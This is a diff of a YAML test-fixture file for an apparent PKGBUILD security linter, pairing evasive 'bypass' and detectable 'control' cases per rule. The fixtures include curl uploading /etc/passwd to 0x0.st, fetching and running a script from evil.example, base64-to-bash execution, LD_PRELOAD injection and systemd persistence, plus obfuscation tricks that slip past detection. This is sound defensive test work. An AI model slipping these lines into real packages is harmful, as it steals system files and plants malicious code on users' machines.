@@ -1,270 +1,376 @@
 cells:
 - id: T004-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n pkgname=probe\n-pkgver=1.0\n-_k=('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB')\n+pkgver=1.1\n+_k=('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')\n validpgpkeys=(\"${_k[@]}\")\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n pkgname=probe\n-pkgver=1.0\n\
+    -_k=('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB')\n\
+    +pkgver=1.1\n+_k=('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')\n validpgpkeys=(\"\
+    ${_k[@]}\")\n"
   expect_absent:
   - T004
 - id: T004-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n pkgname=probe\n-pkgver=1.0\n-validpgpkeys=('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB')\n+pkgver=1.1\n+validpgpkeys=('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n pkgname=probe\n-pkgver=1.0\n\
+    -validpgpkeys=('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB')\n\
+    +pkgver=1.1\n+validpgpkeys=('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')\n"
   expect_fire:
   - T004
 - id: T005-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,5 @@\n pkgname=probe\n-pkgver=1.0\n-source=(\"https://example.org/proj-1.0.tar.gz\")\n+pkgver=1.1\n+_proto=http\n+source=(\"${_proto}://example.org/proj-1.1.tar.gz\")\n sha256sums=('SKIP')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,5 @@\n pkgname=probe\n-pkgver=1.0\n\
+    -source=(\"https://example.org/proj-1.0.tar.gz\")\n+pkgver=1.1\n+_proto=http\n\
+    +source=(\"${_proto}://example.org/proj-1.1.tar.gz\")\n sha256sums=('SKIP')\n"
   expect_absent:
   - T005
 - id: T005-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n pkgname=probe\n-pkgver=1.0\n-source=(\"https://example.org/proj-1.0.tar.gz\")\n+pkgver=1.1\n+source=(\"http://example.org/proj-1.1.tar.gz\")\n sha256sums=('SKIP')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n pkgname=probe\n-pkgver=1.0\n\
+    -source=(\"https://example.org/proj-1.0.tar.gz\")\n+pkgver=1.1\n+source=(\"http://example.org/proj-1.1.tar.gz\"\
+    )\n sha256sums=('SKIP')\n"
   expect_fire:
   - T005
 - id: H001-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,5 @@\n pkgname=probe\n pkgver=1.0\n source=(\"https://example.org/probe-1.0.tar.gz\")\n-sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n+_skip=('SK''IP')\n+sha256sums=(\"${_skip[@]}\")\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ source=(\"https://example.org/probe-1.0.tar.gz\")\n-sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n\
+    +_skip=('SK''IP')\n+sha256sums=(\"${_skip[@]}\")\n"
   expect_absent:
   - H001
 - id: H001-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n pkgname=probe\n pkgver=1.0\n source=(\"https://example.org/probe-1.0.tar.gz\")\n-sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n+sha256sums=('SKIP')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ source=(\"https://example.org/probe-1.0.tar.gz\")\n-sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n\
+    +sha256sums=('SKIP')\n"
   expect_fire:
   - H001
 - id: H004-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,4 +4,5 @@\n arch=('any')\n package() {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  su root -c 'install -Dm755 evil /usr/local/bin/evil'\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,4 +4,5 @@\n arch=('any')\n package()\
+    \ {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  su root\
+    \ -c 'install -Dm755 evil /usr/local/bin/evil'\n }\n"
   expect_absent:
   - H004
 - id: H004-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,4 +4,5 @@\n arch=('any')\n package() {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  sudo install -Dm755 evil /usr/local/bin/evil\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,4 +4,5 @@\n arch=('any')\n package()\
+    \ {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  sudo\
+    \ install -Dm755 evil /usr/local/bin/evil\n }\n"
   expect_fire:
   - H004
 - id: H019-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,5 @@\n pkgname=probe\n pkgver=1.0\n-source=(\"https://example.org/probe-1.0.tar.gz\")\n+_proto=http\n+source=(\"${_proto}://example.org/probe-1.0.tar.gz\")\n sha256sums=('SKIP')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    -source=(\"https://example.org/probe-1.0.tar.gz\")\n+_proto=http\n+source=(\"\
+    ${_proto}://example.org/probe-1.0.tar.gz\")\n sha256sums=('SKIP')\n"
   expect_absent:
   - H019
 - id: H019-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n pkgname=probe\n pkgver=1.0\n-source=(\"https://example.org/probe-1.0.tar.gz\")\n+source=(\"http://example.org/probe-1.0.tar.gz\")\n sha256sums=('SKIP')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n pkgname=probe\n pkgver=1.0\n\
+    -source=(\"https://example.org/probe-1.0.tar.gz\")\n+source=(\"http://example.org/probe-1.0.tar.gz\"\
+    )\n sha256sums=('SKIP')\n"
   expect_fire:
   - H019
 - id: H025-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,6 +1,7 @@\n pkgname=probe\n pkgver=1.0\n arch=('any')\n+export LD_PRELOAD=/tmp/evil.so\n build() {\n   make\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,6 +1,7 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ arch=('any')\n+export LD_PRELOAD=/tmp/evil.so\n build() {\n   make\n }\n"
   expect_absent:
   - H025
 - id: H025-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,6 @@\n pkgver=1.0\n arch=('any')\n build() {\n+  export LD_PRELOAD=/tmp/evil.so\n   make\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,6 @@\n pkgver=1.0\n arch=('any')\n\
+    \ build() {\n+  export LD_PRELOAD=/tmp/evil.so\n   make\n }\n"
   expect_fire:
   - H025
 - id: H032-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3,4 +3,5 @@\n arch=('any')\n package() {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  install -Dm644 evil.desktop /home/alice/.config/autostart/evil.desktop\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3,4 +3,5 @@\n arch=('any')\n package()\
+    \ {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  install\
+    \ -Dm644 evil.desktop /home/alice/.config/autostart/evil.desktop\n }\n"
   expect_absent:
   - H032
 - id: H032-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3,4 +3,5 @@\n arch=('any')\n package() {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  install -Dm644 evil.desktop \"$HOME/.config/autostart/evil.desktop\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3,4 +3,5 @@\n arch=('any')\n package()\
+    \ {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  install\
+    \ -Dm644 evil.desktop \"$HOME/.config/autostart/evil.desktop\"\n }\n"
   expect_fire:
   - H032
 - id: H033-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,6 +1,6 @@\n pkgname=probe\n pkgver=1.0\n pkgrel=1\n-_ref=aaaaaaa\n+_ref=bbbbbbb\n source=('proj::git+https://example.com/probe.git#commit=${_ref}')\n sha256sums=('SKIP')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,6 +1,6 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ pkgrel=1\n-_ref=aaaaaaa\n+_ref=bbbbbbb\n source=('proj::git+https://example.com/probe.git#commit=${_ref}')\n\
+    \ sha256sums=('SKIP')\n"
   expect_absent:
   - H033
 - id: H033-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n pkgrel=1\n-source=('proj::git+https://example.com/probe.git#commit=aaaaaaa')\n+source=('proj::git+https://example.com/probe.git#commit=bbbbbbb')\n sha256sums=('SKIP')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ pkgrel=1\n-source=('proj::git+https://example.com/probe.git#commit=aaaaaaa')\n\
+    +source=('proj::git+https://example.com/probe.git#commit=bbbbbbb')\n sha256sums=('SKIP')\n"
   expect_fire:
   - H033
 - id: H039-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,9 @@\n sha256sums=('SKIP')\n package() {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  install -d \"$pkgdir/usr/lib/systemd/system\"\n+  cat > \"$pkgdir/usr/lib/systemd/system/evil.service\" <<'UNIT'\n+[Service]\n+ExecStart=%T/evil\n+UNIT\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,9 @@\n sha256sums=('SKIP')\n package()\
+    \ {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  install\
+    \ -d \"$pkgdir/usr/lib/systemd/system\"\n+  cat > \"$pkgdir/usr/lib/systemd/system/evil.service\"\
+    \ <<'UNIT'\n+[Service]\n+ExecStart=%T/evil\n+UNIT\n }\n"
   expect_absent:
   - H039
 - id: H039-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,9 @@\n sha256sums=('SKIP')\n package() {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  install -d \"$pkgdir/usr/lib/systemd/system\"\n+  cat > \"$pkgdir/usr/lib/systemd/system/evil.service\" <<'UNIT'\n+[Service]\n+ExecStart=/tmp/evil\n+UNIT\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,9 @@\n sha256sums=('SKIP')\n package()\
+    \ {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  install\
+    \ -d \"$pkgdir/usr/lib/systemd/system\"\n+  cat > \"$pkgdir/usr/lib/systemd/system/evil.service\"\
+    \ <<'UNIT'\n+[Service]\n+ExecStart=/tmp/evil\n+UNIT\n }\n"
   expect_fire:
   - H039
 - id: H041-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,7 @@\n pkgname=probe\n pkgver=1.0\n build() {\n-  echo building\n+  printf -v _h '%s' 0x0.st\n+  printf -v _f '%s' /etc/passwd\n+  curl -F \"file=@$_f\" \"https://$_h\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,7 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ build() {\n-  echo building\n+  printf -v _h '%s' 0x0.st\n+  printf -v _f '%s'\
+    \ /etc/passwd\n+  curl -F \"file=@$_f\" \"https://$_h\"\n }\n"
   expect_absent:
   - H041
 - id: H041-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n build() {\n-  echo building\n+  curl -F \"file=@/etc/passwd\" \"https://0x0.st\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ build() {\n-  echo building\n+  curl -F \"file=@/etc/passwd\" \"https://0x0.st\"\
+    \n }\n"
   expect_fire:
   - H041
 - id: H063-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,5 @@\n pkgname=probe\n pkgver=1.0\n pkgrel=1\n+printf -v epoch '%s' 1\n sha256sums=('SKIP')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ pkgrel=1\n+printf -v epoch '%s' 1\n sha256sums=('SKIP')\n"
   expect_absent:
   - H063
 - id: H063-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,5 @@\n pkgname=probe\n pkgver=1.0\n pkgrel=1\n+epoch=1\n sha256sums=('SKIP')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ pkgrel=1\n+epoch=1\n sha256sums=('SKIP')\n"
   expect_fire:
   - H063
 - id: H085-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,5 @@\n sha256sums=('SKIP')\n package() {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  export PATH=\"$PWD/_bin:$PATH\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,5 @@\n sha256sums=('SKIP')\n package()\
+    \ {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  export\
+    \ PATH=\"$PWD/_bin:$PATH\"\n }\n"
   expect_absent:
   - H085
 - id: H085-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,5 @@\n sha256sums=('SKIP')\n package() {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  export PATH=\"$srcdir/_bin:$PATH\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,5 @@\n sha256sums=('SKIP')\n package()\
+    \ {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  export\
+    \ PATH=\"$srcdir/_bin:$PATH\"\n }\n"
   expect_fire:
   - H085
 - id: H096-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,6 @@\n sha256sums=('SKIP')\n package() {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  DLAGENTS[0]='https::/usr/bin/curl -fsSL -o %u'\n+  curl -o evil \"https://example.org/x\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,6 @@\n sha256sums=('SKIP')\n package()\
+    \ {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  DLAGENTS[0]='https::/usr/bin/curl\
+    \ -fsSL -o %u'\n+  curl -o evil \"https://example.org/x\"\n }\n"
   expect_absent:
   - H096
 - id: H096-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,6 @@\n sha256sums=('SKIP')\n package() {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  DLAGENTS=('https::/usr/bin/curl -fsSL -o %u')\n+  curl -o evil \"https://example.org/x\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,6 @@\n sha256sums=('SKIP')\n package()\
+    \ {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  DLAGENTS=('https::/usr/bin/curl\
+    \ -fsSL -o %u')\n+  curl -o evil \"https://example.org/x\"\n }\n"
   expect_fire:
   - H096
 - id: H108-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,6 @@\n sha256sums=('SKIP')\n package() {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  install -Dm644 evil.service \"$pkgdir/usr/lib/systemd/system/evil.service\"\n+  systemctl --now enable evil.service\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,6 @@\n sha256sums=('SKIP')\n package()\
+    \ {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  install\
+    \ -Dm644 evil.service \"$pkgdir/usr/lib/systemd/system/evil.service\"\n+  systemctl\
+    \ --now enable evil.service\n }\n"
   expect_absent:
   - H108
 - id: H108-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,6 @@\n sha256sums=('SKIP')\n package() {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  install -Dm644 evil.service \"$pkgdir/usr/lib/systemd/system/evil.service\"\n+  systemctl enable evil.service\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,4 +6,6 @@\n sha256sums=('SKIP')\n package()\
+    \ {\n   install -Dm644 README \"$pkgdir/usr/share/doc/probe/README\"\n+  install\
+    \ -Dm644 evil.service \"$pkgdir/usr/lib/systemd/system/evil.service\"\n+  systemctl\
+    \ enable evil.service\n }\n"
   expect_fire:
   - H108
 - id: C001-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n-_sum=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n+_sum=('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb')\n source=(\"https://example.org/probe-1.0.tar.gz\")\n sha256sums=(\"${_sum[@]}\")\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    -_sum=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n+_sum=('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb')\n\
+    \ source=(\"https://example.org/probe-1.0.tar.gz\")\n sha256sums=(\"${_sum[@]}\"\
+    )\n"
   expect_absent:
   - C001
 - id: C001-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n pkgname=probe\n pkgver=1.0\n source=(\"https://example.org/probe-1.0.tar.gz\")\n-sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n+sha256sums=('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ source=(\"https://example.org/probe-1.0.tar.gz\")\n-sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n\
+    +sha256sums=('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb')\n"
   expect_fire:
   - C001
 - id: C020-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n arch=('any')\n-source=(\"https://example.org/probe-1.0.tar.gz\")\n+source=(\"https://example.org/probe-1.0.tar.gz?token=SECRETTOKEN\")\n sha256sums=('SKIP')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ arch=('any')\n-source=(\"https://example.org/probe-1.0.tar.gz\")\n+source=(\"\
+    https://example.org/probe-1.0.tar.gz?token=SECRETTOKEN\")\n sha256sums=('SKIP')\n"
   expect_absent:
   - C020
 - id: C020-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n arch=('any')\n-source=(\"https://example.org/probe-1.0.tar.gz\")\n+source=(\"https://user:pass@example.org/probe-1.0.tar.gz\")\n sha256sums=('SKIP')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ arch=('any')\n-source=(\"https://example.org/probe-1.0.tar.gz\")\n+source=(\"\
+    https://user:pass@example.org/probe-1.0.tar.gz\")\n sha256sums=('SKIP')\n"
   expect_fire:
   - C020
 - id: D003-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n pkgname=probe\n pkgver=1.0\n-makedepends=('cmake')\n+read -r _d <<< curl\n+makedepends=('cmake' \"$_d\")\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n pkgname=probe\n pkgver=1.0\n\
+    -makedepends=('cmake')\n+read -r _d <<< curl\n+makedepends=('cmake' \"$_d\")\n"
   expect_absent:
   - D003
 - id: D003-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n pkgname=probe\n pkgver=1.0\n-makedepends=('cmake')\n+makedepends=('cmake' 'curl')\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n pkgname=probe\n pkgver=1.0\n\
+    -makedepends=('cmake')\n+makedepends=('cmake' 'curl')\n"
   expect_fire:
   - D003
 - id: D004-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n pkgname=probe\n pkgver=1.0\n-provides=('probe')\n+read -r _p <<< bash\n+provides=('probe' \"$_p\")\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n pkgname=probe\n pkgver=1.0\n\
+    -provides=('probe')\n+read -r _p <<< bash\n+provides=('probe' \"$_p\")\n"
   expect_absent:
   - D004
-- id: D004-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n pkgname=probe\n pkgver=1.0\n-provides=('probe')\n+provides=('probe' 'bash')\n"
-  expect_fire:
-  - D004
 - id: R003-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n build() {\n-  echo getting\n+  bash <(base64 -d <<< ZXZpbA==)\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ build() {\n-  echo getting\n+  bash <(base64 -d <<< ZXZpbA==)\n }\n"
   expect_absent:
   - R003
 - id: R003-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n build() {\n-  echo getting\n+  echo ZXZpbA== | base64 -d | bash\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ build() {\n-  echo getting\n+  echo ZXZpbA== | base64 -d | bash\n }\n"
   expect_fire:
   - R003
 - id: R045-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n build() {\n-  echo getting\n+  bash <(xxd -r -p <<< 6576696c)\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ build() {\n-  echo getting\n+  bash <(xxd -r -p <<< 6576696c)\n }\n"
   expect_absent:
   - R045
 - id: R045-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n build() {\n-  echo getting\n+  echo 6576696c | xxd -r -p | bash\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ build() {\n-  echo getting\n+  echo 6576696c | xxd -r -p | bash\n }\n"
   expect_fire:
   - R045
 - id: H064-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n pkgname=probe\n pkgver=1.0\n-provides=('probe')\n+printf -v _n '%s' firefox\n+provides=('probe' \"$_n\")\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n pkgname=probe\n pkgver=1.0\n\
+    -provides=('probe')\n+printf -v _n '%s' firefox\n+provides=('probe' \"$_n\")\n"
   expect_absent:
   - H064
-- id: H064-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n pkgname=probe\n pkgver=1.0\n-provides=('probe')\n+provides=('probe' 'firefox')\n"
-  expect_fire:
-  - H064
 - id: R042-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n build() {\n-  echo building\n+  curl -fsSL -o stage.sh https://evil.example/stage.sh && chmod +x stage.sh && \"$PWD/stage.sh\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ build() {\n-  echo building\n+  curl -fsSL -o stage.sh https://evil.example/stage.sh\
+    \ && chmod +x stage.sh && \"$PWD/stage.sh\"\n }\n"
   expect_absent:
   - R042
 - id: R042-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n build() {\n-  echo building\n+  curl -fsSL -o stage.sh https://evil.example/stage.sh && chmod +x stage.sh && ./stage.sh\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n pkgname=probe\n pkgver=1.0\n\
+    \ build() {\n-  echo building\n+  curl -fsSL -o stage.sh https://evil.example/stage.sh\
+    \ && chmod +x stage.sh && ./stage.sh\n }\n"
   expect_fire:
   - R042
 - id: H038-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,6 +4,11 @@\n arch=('any')\n source=('https://example.com/probe-1.0.tar.gz')\n sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n+build() {\n+  printf -v _d '%s' /tmp\n+  cd \"$_d\"\n+  touch stage\n+}\n package() {\n   :\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,6 +4,11 @@\n arch=('any')\n source=('https://example.com/probe-1.0.tar.gz')\n\
+    \ sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n\
+    +build() {\n+  printf -v _d '%s' /tmp\n+  cd \"$_d\"\n+  touch stage\n+}\n package()\
+    \ {\n   :\n }\n"
   expect_absent:
   - H038
 - id: H038-control
